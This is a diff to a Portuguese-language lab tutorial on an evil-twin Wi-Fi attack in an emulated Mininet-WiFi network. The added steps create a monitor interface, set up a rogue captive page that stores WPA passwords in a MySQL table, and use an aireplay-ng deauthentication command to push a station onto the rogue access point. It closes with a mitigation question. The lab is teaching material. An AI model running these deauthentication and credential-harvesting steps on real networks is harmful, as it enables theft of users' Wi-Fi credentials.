@@ -65,6 +65,7 @@ Antes de tudo você precisa identificar a topologia de rede que será gerada atr
      ap2.cmd('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
      sta2.cmd('route add default gw 192.168.190.1')
+     sta2.cmd('iw dev sta1-wlan0 interface add mon0 type monitor')
      sta1.cmd('iwconfig sta1-wlan0 essid simplewifi ap 02:00:00:00:03:00')
 
      info("*** Running CLI\n")
@@ -138,13 +139,61 @@ Neste momento, você que é `sta2`, deverá conectar-se ao ponto de acesso `ap2`
 
    - Agora, você deverá configurar `ap2` de forma que todo tráfego tendo como porta de origem 80 seja redirecionado para 192.168.190.1 também na porta 80.
    - Como o `ap2` já vem pré-configurado com os recursos de software necessários para a execução do ataque, inicie os serviços `apache2` e `mysql`.
-
+   - Defina o endereço de DNS de `sta2` para 8.8.8.8.
+ 
 Então, ao tentar acessar o endereço http://www.google.com:80 ou qualquer outro site na porta 80 a partir de `sta2`, você deverá obter como resultado algo similar à figura apresentada abaixo:
 
 .. image:: https://github.com/ramonfontes/sphinx_rtd_theme/blob/master/docs/imgs/evil-twin-screenshot.png?raw=true
 
-Em um ambiente bem configurado, não seria necessário definir a porta 80. Qualquer site seria redirecionado para a página apresentada acima. Mesmo que fosse uma página em HTTPs. Aqui, certifique-se, pelo menos, que o arquivo em `ap2` localizado em `/var/www/html/dbconnect.php`, possua o valor definido para a variável $host o mesmo IP da porta `eth0` de `ap2`. 
-    
+Em um ambiente bem configurado, não seria necessário definir a porta 80. Qualquer site seria redirecionado para a página apresentada acima. Mesmo que fosse uma página em HTTPs. Aqui, certifique-se, pelo menos, que o arquivo em `ap2` localizado em `/var/www/html/dbconnect.php` possua o valor definido para a variável $host o mesmo IP da porta `eth0` de `ap2`. Caso contrário, você deverá ter que realizar modificações para que o servidor mysql funcione corretamente.
+
+.. hint::
+
+    - Usuário do banco de dados: rogueuser
+    - Senha do usuário rogueuser: roguepassword
+    - Nome do banco de dados: rogueap
+
+Com todos os passos realizados com sucesso, você agora tem um ambiente pronto. Isso signfica que ao preencher alguma informação nos campos de usuário e senha da página acessada acima e submeter o formulário, as informações serão salvas no banco de dados `rogueap`.
+
+Você pode confirmar a obtenção das informações através de uma consulta na tabela `wpa_keys`, conforme abaixo:
+
+.. admonition:: Passo a ser realizado
+
+     mysql> select * from wpa_keys;
+     +-----------+-----------+
+     | password1 | password2 |
+     +-----------+-----------+
+     | teste     | teste     |
+     +-----------+-----------+
+     1 row in set (0.00 sec)
+
+Agora, só nos basta executar o comando abaixo para forçar a desassociação de `sta1` em relação ao `ap1`.
+
+.. code:: console
+
+   aireplay-ng -00 -a 02:00:00:00:03:00 mon0 --ignore-negative-one
+   
+Você poderá confirmar através do comando abaixo que `sta1` agora está associado ao `ap2`.
+
+
+.. code:: console
+     containernet> sta1 iw dev sta1-wlan0 link
+     Connected to 02:00:00:00:02:00 (on sta1-wlan0)
+      SSID: simplewifi
+      freq: 2412
+      RX: 2816701 bytes (62595 packets)
+      TX: 2544 bytes (104 packets)
+      signal: -36 dBm
+      tx bitrate: 1.0 MBit/s
+
+      bss flags:	short-slot-time
+      dtim period:	2
+      beacon int:	100
+
+
+Qualquer acesso realiado por `sta1` agora será redirecionado para o `ap2`.
+ 
+
 .. admonition:: Perguntas
 
-    -Q1. XXXXX
+    -Q1. Como este ataque pode ser mitigado?
